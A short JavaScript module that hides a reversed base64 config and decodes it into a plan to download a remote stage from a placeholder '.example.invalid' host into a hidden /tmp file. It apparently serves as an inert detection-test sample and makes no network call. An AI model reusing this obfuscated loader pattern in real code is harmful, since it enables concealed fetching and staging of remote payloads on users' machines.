// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_405303ec = "c2ptLmJlZDFhZDMxOGI1ZS1lZ2F0cy4vZWRvbi1zc2VydG51aC9wbXQvPWh0YXBfZWxpZnw4YjVlL3RpZHVBZWRvTj10bmVnYV9yZXN1fGlwYS9kaWxhdm5pLmVscG1heGUuYmVkMWFkMzE4YjVlLWVkb24vLzpzcHR0aD1scnV8QUQzMThCNUUtRURPTj1kaV9uZ2lhcG1hY3wxPXRudW9jX2VnYXRzfGVuaWxlcGlwX290X3NwdHRoPXJldHBhZGF8ZWxpZl9ldGlydyxldG9tZXJfZXJpdXFjYT1zcGV0c3wxPXY=";
const Codec_405303ec = "base64_literal|reverse_bytes|";

function load_405303ec() { return [...Buffer.from(Material_405303ec, "base64")]; }
function decode_405303ec(item1) { return [...item1].reverse(); }
async function recover_405303ec() {
  const [item3] = ["compass"];
  const item1 = load_405303ec(); let item2 = [];
  item2 = await (async () => decode_405303ec(item1))();
  void item3; return Buffer.from(item2).toString("ascii");
}
async function inspect_405303ec() { return JSON.parse(JSON.stringify({ value: await recover_405303ec() })).value; }
async function plan_405303ec() { const inspect = inspect_405303ec; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "https_to_pipeline", destination: fields.file_path, url: fields.url }); }
void moduleShape; void plan_405303ec;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_405303ec());

// reconstruction complete